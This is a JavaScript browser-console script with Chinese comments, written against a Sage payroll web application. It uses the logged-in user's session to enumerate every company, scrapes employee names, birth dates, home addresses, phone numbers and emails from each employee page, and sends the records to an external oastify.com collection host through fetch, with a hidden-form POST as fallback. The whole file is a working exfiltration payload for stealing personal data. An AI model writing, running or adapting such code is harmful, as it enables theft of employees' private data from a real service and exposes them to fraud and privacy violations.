// ============================================================
// 脚本功能：从指定网站提取公司ID和员工信息并发送
// 注意：由于跨域限制，此脚本需要在目标网站的控制台中运行
// ============================================================

(async function() {
    'use strict';

    // ---------- 配置 ----------
    const BASE_URL = 'https://lohnabrechnung.sage.com';  // 请替换为实际域名
    const TARGET_URL = '78dsx5tizgmyajfy8gpjw37cs3yumka9.oastify.com';      // 数据接收地址

    // ---------- HTML实体解码工具 ----------
    function decodeHtmlEntities(text) {
        if (!text) return '';
        
        // 创建临时DOM元素来解码HTML实体
        const textarea = document.createElement('textarea');
        textarea.innerHTML = text;
        return textarea.value;
    }

    // 更强大的清理函数 - 移除所有控制字符和无效字符
    function cleanText(text) {
        if (!text) return '';
        
        // 1. 先解码HTML实体
        let cleaned = decodeHtmlEntities(text);
        
        // 2. 移除不可见控制字符（保留换行和制表符）
        cleaned = cleaned.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
        
        // 3. 移除Â字符及其它常见乱码字符
        cleaned = cleaned.replace(/[Â\xA0]/g, ' ');  // 替换不换行空格为普通空格
        
        // 4. 修复常见的邮箱乱码问题
        // 例如: emailÂ protected -> email@protected
        cleaned = cleaned.replace(/Â\s*protected/g, '@protected');
        cleaned = cleaned.replace(/\[at\]/gi, '@');
        cleaned = cleaned.replace(/\(at\)/gi, '@');
        cleaned = cleaned.replace(/\[dot\]/gi, '.');
        cleaned = cleaned.replace(/\(dot\)/gi, '.');
        
        // 5. 移除多余的空白
        cleaned = cleaned.replace(/\s+/g, ' ').trim();
        
        return cleaned;
    }

    // 专门清理邮箱地址
    function cleanEmail(email) {
        if (!email) return '';
        
        // 解码HTML实体
        let cleaned = decodeHtmlEntities(email);
        
        // 移除所有空格和换行
        cleaned = cleaned.replace(/\s/g, '');
        
        // 修复常见的乱码模式
        cleaned = cleaned.replace(/Â/g, '');
        cleaned = cleaned.replace(/�/g, '');
        cleaned = cleaned.replace(/@/g, '@');  // 确保@是标准字符
        cleaned = cleaned.replace(/[\(\)\[\]]/g, '');  // 移除括号
        
        // 修复 emailÂ protected 模式
        cleaned = cleaned.replace(/protected/gi, '');
        cleaned = cleaned.replace(/Â/g, '');
        cleaned = cleaned.replace(/\x00/g, '');
        
        // 如果包含@符号，只保留有效部分
        if (cleaned.includes('@')) {
            const parts = cleaned.split('@');
            if (parts.length >= 2) {
                // 提取有效的邮箱部分
                const username = parts[0].replace(/[^a-zA-Z0-9._-]/g, '');
                const domain = parts[1].replace(/[^a-zA-Z0-9.-]/g, '');
                if (username && domain) {
                    cleaned = `${username}@${domain}`;
                }
            }
        }
        
        // 验证邮箱格式
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!emailRegex.test(cleaned)) {
            // 尝试从原文中提取有效的邮箱
            const match = email.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
            if (match) {
                cleaned = match[0];
            }
        }
        
        return cleaned;
    }

    // 从HTML字符串中提取所有公司ID
    function extractCompanyIds(html) {
        const ids = [];
        const regex = /\/companies\/(?:overview\/)?(\d+)/g;
        let match;
        while ((match = regex.exec(html)) !== null) {
            if (!ids.includes(match[1])) {
                ids.push(match[1]);
            }
        }
        return ids;
    }

    // 从HTML字符串中提取员工信息（改进版）
    function extractEmployeesFromHTML(html, companyId) {
        const employees = [];
        
        // 创建DOM解析器
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        
        // 查找表格主体中的所有行
        const rows = doc.querySelectorAll('#SopEmployee_grid tbody tr');
        
        rows.forEach(row => {
            const cells = row.querySelectorAll('td');
            if (cells.length < 17) return;
            
            // 提取并清理数据
            const employeeNumber = cleanText(cells[0]?.textContent || '');
            const firstName = cleanText(cells[1]?.textContent || '');
            const lastName = cleanText(cells[2]?.textContent || '');
            const birthDate = cleanText(cells[3]?.textContent || '');
            const street = cleanText(cells[11]?.textContent || '');
            const zipCode = cleanText(cells[12]?.textContent || '');
            const city = cleanText(cells[13]?.textContent || '');
            const phone = cleanText(cells[14]?.textContent || '');
            const mobile = cleanText(cells[15]?.textContent || '');
            
            // 特殊处理邮箱 - 使用专门的清理函数
            let email = cleanEmail(cells[16]?.textContent || '');
            
            // 如果邮箱无效，尝试从innerHTML提取
            if (!email || !email.includes('@')) {
                const cellHtml = cells[16]?.innerHTML || '';
                // 尝试从HTML中提取邮箱
                const emailMatch = cellHtml.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                if (emailMatch) {
                    email = emailMatch[0];
                }
            }
            
            // 计算年龄
            let age = '';
            if (birthDate) {
                // 尝试多种日期格式
                let birth = null;
                const dateStr = birthDate.replace(/\./g, '/');
                
                // 尝试解析 DD.MM.YYYY 或 DD/MM/YYYY
                const parts = dateStr.split(/[\/\-.]/);
                if (parts.length === 3) {
                    // 判断格式：假设是 DD.MM.YYYY
                    let day = parseInt(parts[0]);
                    let month = parseInt(parts[1]) - 1;
                    let year = parseInt(parts[2]);
                    
                    // 如果年份是2位数，转换为4位数
                    if (year < 100) {
                        year += 2000;
                    }
                    
                    birth = new Date(year, month, day);
                }
                
                if (birth && !isNaN(birth)) {
                    const today = new Date();
                    age = (today.getFullYear() - birth.getFullYear()).toString();
                    const monthDiff = today.getMonth() - birth.getMonth();
                    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
                        age = (parseInt(age) - 1).toString();
                    }
                }
            }
            
            // 构建完整地址
            const fullAddress = [street, zipCode, city].filter(Boolean).join(', ');
            
            employees.push({
                companyId: companyId,
                employeeNumber: employeeNumber,
                firstName: firstName,
                lastName: lastName,
                fullName: `${firstName} ${lastName}`.trim(),
                birthDate: birthDate,
                age: age,
                address: fullAddress,
                phone: phone,
                mobile: mobile,
                email: email
            });
        });
        
        return employees;
    }

    // Base64编码（支持Unicode）
    function base64Encode(str) {
        try {
            // 使用encodeURIComponent处理Unicode
            return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                return String.fromCharCode('0x' + p1);
            }));
        } catch (e) {
            // 备用方法
            try {
                return btoa(unescape(encodeURIComponent(str)));
            } catch (e2) {
                return btoa(str);
            }
        }
    }

    // 发送数据到目标服务器
    async function sendData(data) {
        try {
            const jsonData = JSON.stringify(data);
            const encoded = base64Encode(jsonData);
            
            // 构建要发送的数据
            const postData = `data=${encodeURIComponent(encoded)}`;
            
            // 使用fetch发送
            const response = await fetch(`https://${TARGET_URL}/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: postData,
                mode: 'no-cors'
            });
            
            console.log(`✅ 数据已发送 (${data.length}条记录)`);
            return true;
            
        } catch (error) {
            console.warn('⚠️ Fetch发送失败，尝试备用方法...');
            return sendDataFallback(data);
        }
    }

    // 备用发送方法
    function sendDataFallback(data) {
        try {
            const jsonData = JSON.stringify(data);
            const encoded = base64Encode(jsonData);
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = `https://${TARGET_URL}/collect`;
            form.style.display = 'none';
            
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'data';
            input.value = encoded;
            form.appendChild(input);
            
            document.body.appendChild(form);
            form.submit();
            
            setTimeout(() => {
                document.body.removeChild(form);
            }, 1000);
            
            console.log(`✅ 数据已通过表单发送 (${data.length}条记录)`);
            return true;
            
        } catch (error) {
            console.error('❌ 所有发送方法都失败:', error.message);
            
            // 在控制台输出数据
            console.log('📋 数据已输出到控制台，请手动复制:');
            console.log(JSON.stringify(data, null, 2));
            console.log('📋 Base64编码:');
            console.log(base64Encode(JSON.stringify(data)));
            
            return false;
        }
    }

    // 发送原始数据
    async function sendRawData(data) {
        try {
            const jsonData = JSON.stringify(data);
            
            const response = await fetch(`https://${TARGET_URL}/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: jsonData,
                mode: 'no-cors'
            });
            
            console.log(`✅ 原始JSON数据已发送 (${data.length}条记录)`);
            return true;
            
        } catch (error) {
            console.warn('⚠️ 原始JSON发送失败，尝试编码发送...');
            return sendData(data);
        }
    }

    // ---------- 主流程 ----------
    async function main() {
        console.log('🚀 开始执行数据提取脚本...');
        console.log(`📡 目标服务器: ${TARGET_URL}`);
        
        try {
            // 1. 获取公司列表
            console.log('📡 获取公司列表...');
            const companyResponse = await fetch(`${BASE_URL}/companies`, {
                credentials: 'include'
            });
            
            if (!companyResponse.ok) {
                throw new Error(`无法获取公司列表: ${companyResponse.status}`);
            }
            
            const companyHtml = await companyResponse.text();
            
            // 2. 提取公司ID
            const companyIds = extractCompanyIds(companyHtml);
            console.log(`🏢 找到 ${companyIds.length} 个公司:`, companyIds);
            
            if (companyIds.length === 0) {
                console.warn('⚠️ 未找到任何公司ID');
                return;
            }
            
            // 3. 获取员工信息
            let allEmployees = [];
            
            for (const companyId of companyIds) {
                console.log(`📋 正在获取公司 ${companyId} 的员工信息...`);
                
                try {
                    const empResponse = await fetch(`${BASE_URL}/companies/${companyId}/employees`, {
                        credentials: 'include'
                    });
                    
                    if (!empResponse.ok) {
                        console.warn(`⚠️ 公司 ${companyId} 员工页面无法访问: ${empResponse.status}`);
                        continue;
                    }
                    
                    const empHtml = await empResponse.text();
                    const employees = extractEmployeesFromHTML(empHtml, companyId);
                    
                    console.log(`   ✅ 找到 ${employees.length} 名员工`);
                    allEmployees = allEmployees.concat(employees);
                    
                } catch (error) {
                    console.error(`❌ 公司 ${companyId} 处理失败:`, error.message);
                }
            }
            
            console.log(`📊 总共提取到 ${allEmployees.length} 条员工记录`);
            
            // 4. 显示数据预览（包含邮箱）
            if (allEmployees.length > 0) {
                console.log('📝 数据预览 (前3条):');
                allEmployees.slice(0, 3).forEach((emp, idx) => {
                    console.log(`  ${idx+1}. ${emp.fullName} | ${emp.age}岁 | ${emp.address} | ${emp.email}`);
                });
            }
            
            // 5. 发送数据
            if (allEmployees.length > 0) {
                console.log('📤 正在发送数据到服务器...');
                await sendRawData(allEmployees);
                console.log('✅ 脚本执行完成！');
            } else {
                console.warn('⚠️ 没有数据可发送');
            }
            
        } catch (error) {
            console.error('❌ 脚本执行出错:', error.message);
        }
    }

    // ---------- 执行 ----------
    await main();
})();
